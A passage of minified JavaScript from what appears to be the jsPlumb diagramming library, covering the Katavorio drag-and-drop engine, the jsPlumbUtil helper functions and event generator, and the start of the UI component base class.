                    if (b !== !1) {
                        if (!k)
                            return;
                        this.mark(!0),
                        q = !0
                    }
                }
                if (k) {
                    T.length = 0;
                    var c = m(a)
                      , d = c[0] - k[0]
                      , e = c[1] - k[1]
                      , f = this.params.ignoreZoom ? 1 : h.getZoom();
                    d /= f,
                    e /= f,
                    this.moveBy(d, e, a),
                    h.updateSelection(d, e, this),
                    h.updatePosses(d, e, this)
                }
            }
        }
        .bind(this),
        this.upListener = function(a) {
            k && (k = null,
            this.params.unbind(document, "mousemove", this.moveListener),
            this.params.unbind(document, "mouseup", this.upListener),
            this.params.removeClass(document.body, c.noSelect),
            this.unmark(a),
            h.unmarkSelection(this, a),
            h.unmarkPosses(this, a),
            this.stop(a),
            h.notifySelectionDragStop(this, a),
            h.notifyPosseDragStop(this, a),
            q = !1,
            u && (s && s.parentNode && s.parentNode.removeChild(s),
            s = null),
            T.length = 0,
            M && M(this.el, this.params.getPosition(this.el)) === !0 && (this.params.setPosition(this.el, l),
            V("revert", this.el)))
        }
        .bind(this),
        this.getFilters = function() {
            return O
        }
        ,
        this.abort = function() {
            null != k && this.upListener()
        }
        ,
        this.getDragElement = function() {
            return s || this.el
        }
        ;
        var U = {
            start: [],
            drag: [],
            stop: [],
            over: [],
            out: [],
            beforeStart: [],
            revert: []
        };
        b.events.start && U.start.push(b.events.start),
        b.events.beforeStart && U.beforeStart.push(b.events.beforeStart),
        b.events.stop && U.stop.push(b.events.stop),
        b.events.drag && U.drag.push(b.events.drag),
        b.events.revert && U.revert.push(b.events.revert),
        this.on = function(a, b) {
            U[a] && U[a].push(b)
        }
        ,
        this.off = function(a, b) {
            if (U[a]) {
                for (var c = [], d = 0; d < U[a].length; d++)
                    U[a][d] !== b && c.push(U[a][d]);
                U[a] = c
            }
        }
        ;
        var V = function(a, b) {
            if (U[a])
                for (var c = 0; c < U[a].length; c++)
                    try {
                        U[a][c](b)
                    } catch (a) {}
        };
        this.notifyStart = function(a) {
            V("start", {
                el: this.el,
                pos: this.params.getPosition(s),
                e: a,
                drag: this
            })
        }
        ,
        this.stop = function(a, b) {
            if (b || q) {
                var c = []
                  , d = h.getSelection()
                  , e = this.params.getPosition(s);
                if (d.length > 1)
                    for (var f = 0; f < d.length; f++) {
                        var g = this.params.getPosition(d[f].el);
                        c.push([d[f].el, {
                            left: g[0],
                            top: g[1]
                        }, d[f]])
                    }
                else
                    c.push([s, {
                        left: e[0],
                        top: e[1]
                    }, this]);
                V("stop", {
                    el: s,
                    pos: W || e,
                    finalPos: e,
                    e: a,
                    drag: this,
                    selection: c
                })
            }
        }
        ,
        this.mark = function(a) {
            l = this.params.getPosition(s),
            n = this.params.getPosition(s, !0),
            o = [n[0] - l[0], n[1] - l[1]],
            this.size = this.params.getSize(s),
            S = h.getMatchingDroppables(this),
            v(S, !0, !1, this),
            this.params.addClass(s, this.params.dragClass || c.drag);
            var b = this.params.getSize(s.parentNode);
            R = {
                w: b[0],
                h: b[1]
            },
            a && h.notifySelectionDragStart(this)
        }
        ;
        var W;
        this.unmark = function(a, d) {
            if (v(S, !1, !0, this),
            y && D(this.el) ? (W = [s.offsetLeft, s.offsetTop],
            this.el.parentNode.removeChild(s),
            s = this.el) : W = null,
            this.params.removeClass(s, this.params.dragClass || c.drag),
            S.length = 0,
            y = !1,
            !d) {
                T.length > 0 && W && b.setPosition(this.el, W),
                T.sort(G);
                for (var e = 0; e < T.length; e++) {
                    var f = T[e].drop(this, a);
                    if (f === !0)
                        break
                }
            }
        }
        ,
        this.moveBy = function(a, c, d) {
            T.length = 0;
            var e = this.toGrid([l[0] + a, l[1] + c])
              , f = J(e, s);
            if (D(this.el))
                if (e[0] != f[0] || e[1] != f[1]) {
                    if (!y) {
                        var g = E(this.el);
                        b.addClass(g, p.ghostProxy),
                        this.el.parentNode.appendChild(g),
                        s = g,
                        y = !0
                    }
                    f = e
                } else
                    y && (this.el.parentNode.removeChild(s),
                    s = this.el,
                    y = !1);
            var h = {
                x: f[0],
                y: f[1],
                w: this.size[0],
                h: this.size[1]
            }
              , i = {
                x: h.x + o[0],
                y: h.y + o[1],
                w: h.w,
                h: h.h
            }
              , j = null;
            this.params.setPosition(s, f);
            for (var k = 0; k < S.length; k++) {
                var m = {
                    x: S[k].pagePosition[0],
                    y: S[k].pagePosition[1],
                    w: S[k].size[0],
                    h: S[k].size[1]
                };
                this.params.intersects(i, m) && (w || null == j || j == S[k].el) && S[k].canDrop(this) ? (j || (j = S[k].el),
                T.push(S[k]),
                S[k].setHover(this, !0, d)) : S[k].isHover() && S[k].setHover(this, !1, d)
            }
            V("drag", {
                el: this.el,
                pos: f,
                e: d,
                drag: this
            })
        }
        ,
        this.destroy = function() {
            this.params.unbind(this.el, "mousedown", this.downListener),
            this.params.unbind(document, "mousemove", this.moveListener),
            this.params.unbind(document, "mouseup", this.upListener),
            this.downListener = null,
            this.upListener = null,
            this.moveListener = null
        }
        ,
        this.params.bind(this.el, "mousedown", this.downListener),
        this.params.handle ? Q(this.params.handle, !1) : Q(this.params.filter, this.params.filterExclude)
    }
      , E = function(a, b, c, d) {
        this._class = c.droppable,
        this.params = b || {},
        this.rank = b.rank || 0,
        this._activeClass = this.params.activeClass || c.active,
        this._hoverClass = this.params.hoverClass || c.hover,
        A.apply(this, arguments);
        var e = !1;
        this.allowLoopback = this.params.allowLoopback !== !1,
        this.setActive = function(a) {
            this.params[a ? "addClass" : "removeClass"](this.el, this._activeClass)
        }
        ,
        this.updatePosition = function() {
            this.position = this.params.getPosition(this.el),
            this.pagePosition = this.params.getPosition(this.el, !0),
            this.size = this.params.getSize(this.el)
        }
        ,
        this.canDrop = this.params.canDrop || function(a) {
            return !0
        }
        ,
        this.isHover = function() {
            return e
        }
        ,
        this.setHover = function(a, b, c) {
            (b || null == this.el._katavorioDragHover || this.el._katavorioDragHover == a.el._katavorio) && (this.params[b ? "addClass" : "removeClass"](this.el, this._hoverClass),
            this.el._katavorioDragHover = b ? a.el._katavorio : null,
            e !== b && this.params.events[b ? "over" : "out"]({
                el: this.el,
                e: c,
                drag: a,
                drop: this
            }),
            e = b)
        }
        ,
        this.drop = function(a, b) {
            return this.params.events.drop({
                drag: a,
                e: b,
                drop: this
            })
        }
        ,
        this.destroy = function() {
            this._class = null,
            this._activeClass = null,
            this._hoverClass = null,
            e = null
        }
    }
      , F = function() {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
            var b = 16 * Math.random() | 0
              , c = "x" == a ? b : 3 & b | 8;
            return c.toString(16)
        })
    }
      , G = function(a, b) {
        return a.rank < b.rank ? 1 : a.rank > b.rank ? -1 : 0
    }
      , H = function(a) {
        return null == a ? null : (a = "string" == typeof a || a.constructor == String ? document.getElementById(a) : a,
        null == a ? null : (a._katavorio = a._katavorio || F(),
        a))
    };
    a.Katavorio = function(a) {
        var f = []
          , g = {};
        this._dragsByScope = {},
        this._dropsByScope = {};
        var h = 1
          , i = function(a, b) {
            w(a, function(a) {
                for (var c = 0; c < a.scopes.length; c++)
                    b[a.scopes[c]] = b[a.scopes[c]] || [],
                    b[a.scopes[c]].push(a)
            })
        }
          , j = function(b, c) {
            var d = 0;
            return w(b, function(b) {
                for (var e = 0; e < b.scopes.length; e++)
                    if (c[b.scopes[e]]) {
                        var f = a.indexOf(c[b.scopes[e]], b);
                        f != -1 && (c[b.scopes[e]].splice(f, 1),
                        d++)
                    }
            }),
            d > 0
        }
          , k = (this.getMatchingDroppables = function(a) {
            for (var b = [], c = {}, d = 0; d < a.scopes.length; d++) {
                var e = this._dropsByScope[a.scopes[d]];
                if (e)
                    for (var f = 0; f < e.length; f++)
                        !e[f].canDrop(a) || c[e[f].uuid] || !e[f].allowLoopback && e[f].el === a.el || (c[e[f].uuid] = !0,
                        b.push(e[f]))
            }
            return b.sort(G),
            b
        }
        ,
        function(b) {
            b = b || {};
            var c, d = {
                events: {}
            };
            for (c in a)
                d[c] = a[c];
            for (c in b)
                d[c] = b[c];
            for (c = 0; c < r.length; c++)
                d.events[r[c]] = b[r[c]] || s;
            return d.katavorio = this,
            d
        }
        .bind(this))
          , l = function(a, b) {
            for (var c = 0; c < r.length; c++)
                b[r[c]] && a.on(r[c], b[r[c]])
        }
        .bind(this)
          , m = {}
          , n = a.css || {}
          , o = a.scope || q;
        for (var t in p)
            m[t] = p[t];
        for (var t in n)
            m[t] = n[t];
        var v = a.inputFilterSelector || y;
        this.getInputFilterSelector = function() {
            return v
        }
        ,
        this.setInputFilterSelector = function(a) {
            return v = a,
            this
        }
        ,
        this.draggable = function(b, c) {
            var d = [];
            return w(b, function(b) {
                if (b = H(b),
                null != b)
                    if (null == b._katavorioDrag) {
                        var e = k(c);
                        b._katavorioDrag = new D(b,e,m,o),
                        i(b._katavorioDrag, this._dragsByScope),
                        d.push(b._katavorioDrag),
                        a.addClass(b, m.draggable)
                    } else
                        l(b._katavorioDrag, c)
            }
            .bind(this)),
            d
        }
        ,
        this.droppable = function(b, c) {
            var d = [];
            return w(b, function(b) {
                if (b = H(b),
                null != b) {
                    var e = new E(b,k(c),m,o);
                    b._katavorioDrop = b._katavorioDrop || [],
                    b._katavorioDrop.push(e),
                    i(e, this._dropsByScope),
                    d.push(e),
                    a.addClass(b, m.droppable)
                }
            }
            .bind(this)),
            d
        }
        ,
        this.select = function(b) {
            return w(b, function() {
                var b = H(this);
                b && b._katavorioDrag && (g[b._katavorio] || (f.push(b._katavorioDrag),
                g[b._katavorio] = [b, f.length - 1],
                a.addClass(b, m.selected)))
            }),
            this
        }
        ,
        this.deselect = function(b) {
            return w(b, function() {
                var b = H(this);
                if (b && b._katavorio) {
                    var c = g[b._katavorio];
                    if (c) {
                        for (var d = [], e = 0; e < f.length; e++)
                            f[e].el !== b && d.push(f[e]);
                        f = d,
                        delete g[b._katavorio],
                        a.removeClass(b, m.selected)
                    }
                }
            }),
            this
        }
        ,
        this.deselectAll = function() {
            for (var b in g) {
                var c = g[b];
                a.removeClass(c[0], m.selected)
            }
            f.length = 0,
            g = {}
        }
        ,
        this.markSelection = function(a) {
            u(f, function(a) {
                a.mark()
            }, a)
        }
        ,
        this.markPosses = function(a) {
            a.posses && w(a.posses, function(b) {
                a.posseRoles[b] && B[b] && u(B[b].members, function(a) {
                    a.mark()
                }, a)
            })
        }
        ,
        this.unmarkSelection = function(a, b) {
            u(f, function(a) {
                a.unmark(b)
            }, a)
        }
        ,
        this.unmarkPosses = function(a, b) {
            a.posses && w(a.posses, function(c) {
                a.posseRoles[c] && B[c] && u(B[c].members, function(a) {
                    a.unmark(b, !0)
                }, a)
            })
        }
        ,
        this.getSelection = function() {
            return f.slice(0)
        }
        ,
        this.updateSelection = function(a, b, c) {
            u(f, function(c) {
                c.moveBy(a, b)
            }, c)
        }
        ;
        var x = function(a, b) {
            b.posses && w(b.posses, function(c) {
                b.posseRoles[c] && B[c] && u(B[c].members, function(b) {
                    a(b)
                }, b)
            })
        };
        this.updatePosses = function(a, b, c) {
            x(function(c) {
                c.moveBy(a, b)
            }, c)
        }
        ,
        this.notifyPosseDragStop = function(a, b) {
            x(function(a) {
                a.stop(b, !0)
            }, a)
        }
        ,
        this.notifySelectionDragStop = function(a, b) {
            u(f, function(a) {
                a.stop(b, !0)
            }, a)
        }
        ,
        this.notifySelectionDragStart = function(a, b) {
            u(f, function(a) {
                a.notifyStart(b)
            }, a)
        }
        ,
        this.setZoom = function(a) {
            h = a
        }
        ,
        this.getZoom = function() {
            return h
        }
        ;
        var z = function(a, b, c, d) {
            w(a, function(a) {
                j(a, c),
                a[d](b),
                i(a, c)
            })
        };
        w(["set", "add", "remove", "toggle"], function(a) {
            this[a + "Scope"] = function(b, c) {
                z(b._katavorioDrag, c, this._dragsByScope, a + "Scope"),
                z(b._katavorioDrop, c, this._dropsByScope, a + "Scope")
            }
            .bind(this),
            this[a + "DragScope"] = function(b, c) {
                z(b.constructor === D ? b : b._katavorioDrag, c, this._dragsByScope, a + "Scope")
            }
            .bind(this),
            this[a + "DropScope"] = function(b, c) {
                z(b.constructor === E ? b : b._katavorioDrop, c, this._dropsByScope, a + "Scope")
            }
            .bind(this)
        }
        .bind(this)),
        this.snapToGrid = function(a, b) {
            for (var c in this._dragsByScope)
                u(this._dragsByScope[c], function(c) {
                    c.snap(a, b)
                })
        }
        ,
        this.getDragsForScope = function(a) {
            return this._dragsByScope[a]
        }
        ,
        this.getDropsForScope = function(a) {
            return this._dropsByScope[a]
        }
        ;
        var A = function(a, b, c) {
            if (a = H(a),
            a[b]) {
                var d = f.indexOf(a[b]);
                d >= 0 && f.splice(d, 1),
                j(a[b], c) && w(a[b], function(a) {
                    a.destroy()
                }),
                delete a[b]
            }
        };
        this.elementRemoved = function(a) {
            this.destroyDraggable(a),
            this.destroyDroppable(a)
        }
        ,
        this.destroyDraggable = function(a) {
            A(a, "_katavorioDrag", this._dragsByScope)
        }
        ,
        this.destroyDroppable = function(a) {
            A(a, "_katavorioDrop", this._dropsByScope)
        }
        ,
        this.reset = function() {
            this._dragsByScope = {},
            this._dropsByScope = {},
            f = [],
            g = {},
            B = {}
        }
        ;
        var B = {}
          , C = function(a, c, d) {
            var f = e(c) ? c : c.id
              , g = !!e(c) || c.active !== !1
              , h = B[f] || function() {
                var a = {
                    name: f,
                    members: []
                };
                return B[f] = a,
                a
            }();
            return w(a, function(a) {
                if (a._katavorioDrag) {
                    if (d && null != a._katavorioDrag.posseRoles[h.name])
                        return;
                    b(h.members, a._katavorioDrag),
                    b(a._katavorioDrag.posses, h.name),
                    a._katavorioDrag.posseRoles[h.name] = g
                }
            }),
            h
        };
        this.addToPosse = function(a, b) {
            for (var c = [], d = 1; d < arguments.length; d++)
                c.push(C(a, arguments[d]));
            return 1 == c.length ? c[0] : c
        }
        ,
        this.setPosse = function(a, b) {
            for (var c = [], e = 1; e < arguments.length; e++)
                c.push(C(a, arguments[e], !0).name);
            return w(a, function(a) {
                if (a._katavorioDrag) {
                    var b = d(a._katavorioDrag.posses, c)
                      , e = [];
                    Array.prototype.push.apply(e, a._katavorioDrag.posses);
                    for (var f = 0; f < b.length; f++)
                        this.removeFromPosse(a, b[f])
                }
            }
            .bind(this)),
            1 == c.length ? c[0] : c
        }
        ,
        this.removeFromPosse = function(a, b) {
            if (arguments.length < 2)
                throw new TypeError("No posse id provided for remove operation");
            for (var d = 1; d < arguments.length; d++)
                b = arguments[d],
                w(a, function(a) {
                    if (a._katavorioDrag && a._katavorioDrag.posses) {
                        var d = a._katavorioDrag;
                        w(b, function(a) {
                            c(B[a].members, d),
                            c(d.posses, a),
                            delete d.posseRoles[a]
                        })
                    }
                })
        }
        ,
        this.removeFromAllPosses = function(a) {
            w(a, function(a) {
                if (a._katavorioDrag && a._katavorioDrag.posses) {
                    var b = a._katavorioDrag;
                    w(b.posses, function(a) {
                        c(B[a].members, b)
                    }),
                    b.posses.length = 0,
                    b.posseRoles = {}
                }
            })
        }
        ,
        this.setPosseState = function(a, b, c) {
            var d = B[b];
            d && w(a, function(a) {
                a._katavorioDrag && a._katavorioDrag.posses && (a._katavorioDrag.posseRoles[d.name] = c)
            })
        }
    }
    ,
    a.Katavorio.version = "0.19.2",
    "undefined" != typeof exports && (exports.Katavorio = a.Katavorio)
}
.call("undefined" != typeof window ? window : this),
function() {
    var a = function(a) {
        return "[object Array]" === Object.prototype.toString.call(a)
    }
      , b = function(a) {
        return "[object Number]" === Object.prototype.toString.call(a)
    }
      , c = function(a) {
        return "string" == typeof a
    }
      , d = function(a) {
        return "boolean" == typeof a
    }
      , e = function(a) {
        return null == a
    }
      , f = function(a) {
        return null != a && "[object Object]" === Object.prototype.toString.call(a)
    }
      , g = function(a) {
        return "[object Date]" === Object.prototype.toString.call(a)
    }
      , h = function(a) {
        return "[object Function]" === Object.prototype.toString.call(a)
    }
      , i = function(a) {
        for (var b in a)
            if (a.hasOwnProperty(b))
                return !1;
        return !0
    }
      , j = this;
    j.jsPlumbUtil = {
        isArray: a,
        isString: c,
        isBoolean: d,
        isNull: e,
        isObject: f,
        isDate: g,
        isFunction: h,
        isEmpty: i,
        isNumber: b,
        clone: function(b) {
            if (c(b))
                return "" + b;
            if (d(b))
                return !!b;
            if (g(b))
                return new Date(b.getTime());
            if (h(b))
                return b;
            if (a(b)) {
                for (var e = [], i = 0; i < b.length; i++)
                    e.push(this.clone(b[i]));
                return e
            }
            if (f(b)) {
                var j = {};
                for (var k in b)
                    j[k] = this.clone(b[k]);
                return j
            }
            return b
        },
        merge: function(b, e, g) {
            var h, i, j = {};
            for (g = g || [],
            i = 0; i < g.length; i++)
                j[g[i]] = !0;
            var k = this.clone(b);
            for (i in e)
                if (null == k[i])
                    k[i] = e[i];
                else if (c(e[i]) || d(e[i]))
                    j[i] ? (h = [],
                    h.push.apply(h, a(k[i]) ? k[i] : [k[i]]),
                    h.push.apply(h, a(e[i]) ? e[i] : [e[i]]),
                    k[i] = h) : k[i] = e[i];
                else if (a(e[i]))
                    h = [],
                    a(k[i]) && h.push.apply(h, k[i]),
                    h.push.apply(h, e[i]),
                    k[i] = h;
                else if (f(e[i])) {
                    f(k[i]) || (k[i] = {});
                    for (var l in e[i])
                        k[i][l] = e[i][l]
                }
            return k
        },
        replace: function(a, b, c) {
            if (null != a) {
                var d = a
                  , e = d;
                return b.replace(/([^\.])+/g, function(a, b, d, f) {
                    var g = a.match(/([^\[0-9]+){1}(\[)([0-9+])/)
                      , h = d + a.length >= f.length
                      , i = function() {
                        return e[g[1]] || function() {
                            return e[g[1]] = [],
                            e[g[1]]
                        }()
                    };
                    if (h)
                        g ? i()[g[3]] = c : e[a] = c;
                    else if (g) {
                        var j = i();
                        e = j[g[3]] || function() {
                            return j[g[3]] = {},
                            j[g[3]]
                        }()
                    } else
                        e = e[a] || function() {
                            return e[a] = {},
                            e[a]
                        }()
                }),
                a
            }
        },
        functionChain: function(a, b, c) {
            for (var d = 0; d < c.length; d++) {
                var e = c[d][0][c[d][1]].apply(c[d][0], c[d][2]);
                if (e === b)
                    return e
            }
            return a
        },
        populate: function(b, d, e) {
            var g = function(a) {
                var b = a.match(/(\${.*?})/g);
                if (null != b)
                    for (var c = 0; c < b.length; c++) {
                        var e = d[b[c].substring(2, b[c].length - 1)] || "";
                        null != e && (a = a.replace(b[c], e))
                    }
                return a
            }
              , i = function(b) {
                if (null != b) {
                    if (c(b))
                        return g(b);
                    if (!h(b) || null != e && 0 !== (b.name || "").indexOf(e)) {
                        if (a(b)) {
                            for (var j = [], k = 0; k < b.length; k++)
                                j.push(i(b[k]));
                            return j
                        }
                        if (f(b)) {
                            var l = {};
                            for (var m in b)
                                l[m] = i(b[m]);
                            return l
                        }
                        return b
                    }
                    return b(d)
                }
            };
            return i(b)
        },
        findWithFunction: function(a, b) {
            if (a)
                for (var c = 0; c < a.length; c++)
                    if (b(a[c]))
                        return c;
            return -1
        },
        removeWithFunction: function(a, b) {
            var c = j.jsPlumbUtil.findWithFunction(a, b);
            return c > -1 && a.splice(c, 1),
            c !== -1
        },
        remove: function(a, b) {
            var c = a.indexOf(b);
            return c > -1 && a.splice(c, 1),
            c !== -1
        },
        addWithFunction: function(a, b, c) {
            j.jsPlumbUtil.findWithFunction(a, c) === -1 && a.push(b)
        },
        addToList: function(a, b, c, d) {
            var e = a[b];
            return null == e && (e = [],
            a[b] = e),
            e[d ? "unshift" : "push"](c),
            e
        },
        suggest: function(a, b, c) {
            return a.indexOf(b) === -1 && (c ? a.unshift(b) : a.push(b),
            !0)
        },
        extend: function(b, c, d) {
            var e;
            for (c = a(c) ? c : [c],
            e = 0; e < c.length; e++)
                for (var f in c[e].prototype)
                    c[e].prototype.hasOwnProperty(f) && (b.prototype[f] = c[e].prototype[f]);
            var g = function(a, b) {
                return function() {
                    for (e = 0; e < c.length; e++)
                        c[e].prototype[a] && c[e].prototype[a].apply(this, arguments);
                    return b.apply(this, arguments)
                }
            }
              , h = function(a) {
                for (var c in a)
                    b.prototype[c] = g(c, a[c])
            };
            if (arguments.length > 2)
                for (e = 2; e < arguments.length; e++)
                    h(arguments[e]);
            return b
        },
        uuid: function() {
            return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
                var b = 16 * Math.random() | 0
                  , c = "x" === a ? b : 3 & b | 8;
                return c.toString(16)
            })
        },
        logEnabled: !0,
        log: function() {
            if (j.jsPlumbUtil.logEnabled && "undefined" != typeof console)
                try {
                    var a = arguments[arguments.length - 1];
                    console.log(a)
                } catch (a) {}
        },
        wrap: function(a, b, c) {
            return a = a || function() {}
            ,
            b = b || function() {}
            ,
            function() {
                var d = null;
                try {
                    d = b.apply(this, arguments)
                } catch (a) {
                    j.jsPlumbUtil.log("jsPlumb function failed : " + a)
                }
                if (null == c || d !== c)
                    try {
                        d = a.apply(this, arguments)
                    } catch (a) {
                        j.jsPlumbUtil.log("wrapped function failed : " + a)
                    }
                return d
            }
        }
    },
    j.jsPlumbUtil.EventGenerator = function() {
        var a = {}
          , b = !1
          , c = {
            ready: !0
        };
        this.bind = function(b, c, d) {
            var e = function(b) {
                j.jsPlumbUtil.addToList(a, b, c, d),
                c.__jsPlumb = c.__jsPlumb || {},
                c.__jsPlumb[j.jsPlumbUtil.uuid()] = b
            };
            if ("string" == typeof b)
                e(b);
            else if (null != b.length)
                for (var f = 0; f < b.length; f++)
                    e(b[f]);
            return this
        }
        ,
        this.fire = function(d, e, f) {
            if (!b && a[d]) {
                var g = a[d].length
                  , h = 0
                  , i = !1
                  , k = null;
                if (!this.shouldFireEvent || this.shouldFireEvent(d, e, f))
                    for (; !i && h < g && k !== !1; ) {
                        if (c[d])
                            a[d][h].apply(this, [e, f]);
                        else
                            try {
                                k = a[d][h].apply(this, [e, f])
                            } catch (a) {
                                j.jsPlumbUtil.log("jsPlumb: fire failed for event " + d + " : " + a)
                            }
                        h++,
                        null != a && null != a[d] || (i = !0)
                    }
            }
            return this
        }
        ,
        this.unbind = function(b, c) {
            if (0 === arguments.length)
                a = {};
            else if (1 === arguments.length) {
                if ("string" == typeof b)
                    delete a[b];
                else if (b.__jsPlumb) {
                    var d;
                    for (var e in b.__jsPlumb)
                        d = b.__jsPlumb[e],
                        j.jsPlumbUtil.remove(a[d] || [], b)
                }
            } else
                2 === arguments.length && j.jsPlumbUtil.remove(a[b] || [], c);
            return this
        }
        ,
        this.getListener = function(b) {
            return a[b]
        }
        ,
        this.setSuspendEvents = function(a) {
            b = a
        }
        ,
        this.isSuspendEvents = function() {
            return b
        }
        ,
        this.silently = function(a) {
            this.setSuspendEvents(!0);
            try {
                a()
            } catch (a) {
                j.jsPlumbUtil.log("Cannot execute silent function " + a)
            }
            this.setSuspendEvents(!1)
        }
        ,
        this.cleanupListeners = function() {
            for (var b in a)
                a[b] = null
        }
    }
    ,
    j.jsPlumbUtil.EventGenerator.prototype = {
        cleanup: function() {
            this.cleanupListeners()
        }
    },
    "undefined" != typeof exports && (exports.jsPlumbUtil = j.jsPlumbUtil)
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a = this;
    a.jsPlumbUtil.matchesSelector = function(a, b, c) {
        c = c || a.parentNode;
        for (var d = c.querySelectorAll(b), e = 0; e < d.length; e++)
            if (d[e] === a)
                return !0;
        return !1
    }
    ,
    a.jsPlumbUtil.consume = function(a, b) {
        a.stopPropagation ? a.stopPropagation() : a.returnValue = !1,
        !b && a.preventDefault && a.preventDefault()
    }
    ,
    a.jsPlumbUtil.sizeElement = function(a, b, c, d, e) {
        a && (a.style.height = e + "px",
        a.height = e,
        a.style.width = d + "px",
        a.width = d,
        a.style.left = b + "px",
        a.style.top = c + "px")
    }
}
.call("undefined" != typeof window ? window : this),
function() {
    "use strict";
    var a, b = this, c = [], d = b.jsPlumbUtil, e = function() {
        return "" + (new Date).getTime()
    }, f = function(a) {
        if (a._jsPlumb.paintStyle && a._jsPlumb.hoverPaintStyle) {
            var b = {};
            r.extend(b, a._jsPlumb.paintStyle),
            r.extend(b, a._jsPlumb.hoverPaintStyle),
            delete a._jsPlumb.hoverPaintStyle,
            b.gradient && a._jsPlumb.paintStyle.fill && delete b.gradient,
            a._jsPlumb.hoverPaintStyle = b
        }
    }, g = ["tap", "dbltap", "click", "dblclick", "mouseover", "mouseout", "mousemove", "mousedown", "mouseup", "contextmenu"], h = function(a, b, c, d) {
        var e = a.getAttachedElements();
        if (e)
            for (var f = 0, g = e.length; f < g; f++)
                d && d === e[f] || e[f].setHover(b, !0, c)
    }, i = function(a) {
        return null == a ? null : a.split(" ")
    }, j = function(a, b, c) {
        for (var d in b)
            a[d] = c
    }, k = function(a, b) {
        b = d.isArray(b) || null != b.length && !d.isString(b) ? b : [b];
        for (var c = 0; c < b.length; c++)
            try {
                a.apply(b[c], [b[c]])
            } catch (a) {
                d.log(".each iteration failed : " + a)
            }
    }, l = function(a, b, c) {
        if (a.getDefaultType) {
            var e = a.getTypeDescriptor()
              , f = {}
              , g = a.getDefaultType()
              , h = d.merge({}, g);
            j(f, g, "__default");
            for (var i = 0, k = a._jsPlumb.types.length; i < k; i++) {
                var l = a._jsPlumb.types[i];
                if ("__default" !== l) {
                    var m = a._jsPlumb.instance.getType(l, e);
                    null != m && (h = d.merge(h, m, ["cssClass"]),
                    j(f, m, l))
                }
            }
            b && (h = d.populate(h, b, "_")),
            a.applyType(h, c, f),
            c || a.repaint()
        }
    }, m = b.jsPlumbUIComponent = function(a) {
        d.EventGenerator.apply(this, arguments);
        var b = this
          , c = arguments
          , e = b.idPrefix
          , f = e + (new Date).getTime();
        this._jsPlumb = {
            instance: a._jsPlumb,
            parameters: a.parameters || {},
            paintStyle: null,
            hoverPaintStyle: null,
            paintStyleInUse: null,
            hover: !1,
            beforeDetach: a.beforeDetach,
            beforeDrop: a.beforeDrop,
            overlayPlacements: [],
            hoverClass: a.hoverClass || a._jsPlumb.Defaults.HoverClass,
            types: [],
            typeCache: {}
        },
        this.cacheTypeItem = function(a, b, c) {
            this._jsPlumb.typeCache[c] = this._jsPlumb.typeCache[c] || {},
            this._jsPlumb.typeCache[c][a] = b
        }
        ,
        this.getCachedTypeItem = function(a, b) {
            return this._jsPlumb.typeCache[b] ? this._jsPlumb.typeCache[b][a] : null
        }
        ,
        this.getId = function() {
            return f
        }
        ;
        var g = a.overlays || []
          , h = {};
        if (this.defaultOverlayKeys) {
            for (var i = 0; i < this.defaultOverlayKeys.length; i++)
                Array.prototype.push.apply(g, this._jsPlumb.instance.Defaults[this.defaultOverlayKeys[i]] || []);
            for (i = 0; i < g.length; i++) {
                var j = r.convertToFullOverlaySpec(g[i]);
                h[j[1].id] = j
            }
        }
        var k = {
            overlays: h,
            parameters: a.parameters || {},
            scope: a.scope || this._jsPlumb.instance.getDefaultScope()
        };
        if (this.getDefaultType = function() {
            return k
        }
        ,
        this.appendToDefaultType = function(a) {
            for (var b in a)
                k[b] = a[b]
        }
        ,
        a.events)
            for (var l in a.events)
                b.bind(l, a.events[l]);
        this.clone = function() {
            var a = Object.create(this.constructor.prototype);
            return this.constructor.apply(a, c),
            a
        }
        .bind(this),
        this.isDetachAllowed = function(a) {
            var b = !0;
            if (this._jsPlumb.beforeDetach)
                try {
                    b = this._jsPlumb.beforeDetach(a)
                } catch (a) {
                    d.log("jsPlumb: beforeDetach callback failed", a)
                }
            return b
        }
        ,
        this.isDropAllowed = function(a, b, c, e, f, g, h) {
            var i = this._jsPlumb.instance.checkCondition("beforeDrop", {
                sourceId: a,
                targetId: b,
                scope: c,
                connection: e,
                dropEndpoint: f,
                source: g,
                target: h
            });
            if (this._jsPlumb.beforeDrop)
                try {
                    i = this._jsPlumb.beforeDrop({
                        sourceId: a,
                        targetId: b,
                        scope: c,
                        connection: e,
                        dropEndpoint: f,
                        source: g,
                        target: h
                    })
                } catch (a) {
                    d.log("jsPlumb: beforeDrop callback failed", a)
                }
            return i
        }
        ;
        var m = [];
        this.setListenerComponent = function(a) {
            for (var b = 0; b < m.length; b++)
                m[b][3] = a
        }
    }
    , n = function(a, b) {
        var c = a._jsPlumb.types[b]
          , d = a._jsPlumb.instance.getType(c, a.getTypeDescriptor());
        null != d && d.cssClass && a.canvas && a._jsPlumb.instance.removeClass(a.canvas, d.cssClass)
    };
    d.extend(b.jsPlumbUIComponent, d.EventGenerator, {
        getParameter: function(a) {
            return this._jsPlumb.parameters[a]
        },
        setParameter: function(a, b) {
            this._jsPlumb.parameters[a] = b
        },
        getParameters: function() {
            return this._jsPlumb.parameters
        },
        setParameters: function(a) {
            this._jsPlumb.parameters = a
        },
        getClass: function() {
            return r.getClass(this.canvas)
        },
        hasClass: function(a) {
            return r.hasClass(this.canvas, a)
        },
        addClass: function(a) {
            r.addClass(this.canvas, a)
        },
        removeClass: function(a) {
            r.removeClass(this.canvas, a)
        },
        updateClasses: function(a, b) {
            r.updateClasses(this.canvas, a, b)
        },
        setType: function(a, b, c) {
            this.clearTypes(),
            this._jsPlumb.types = i(a) || [],
            l(this, b, c)
        },
        getType: function() {
            return this._jsPlumb.types
        },
        reapplyTypes: function(a, b) {
            l(this, a, b)
        },
        hasType: function(a) {
            return this._jsPlumb.types.indexOf(a) !== -1
        },
        addType: function(a, b, c) {
            var d = i(a)
              , e = !1;
            if (null != d) {
                for (var f = 0, g = d.length; f < g; f++)
                    this.hasType(d[f]) || (this._jsPlumb.types.push(d[f]),
                    e = !0);
                e && l(this, b, c)
            }
        },
        removeType: function(a, b, c) {
            var d = i(a)
              , e = !1
              , f = function(a) {
                var b = this._jsPlumb.types.indexOf(a);
                return b !== -1 && (n(this, b),
                this._jsPlumb.types.splice(b, 1),
                !0)
            }
            .bind(this);
            if (null != d) {
                for (var g = 0, h = d.length; g < h; g++)
                    e = f(d[g]) || e;
                e && l(this, b, c)
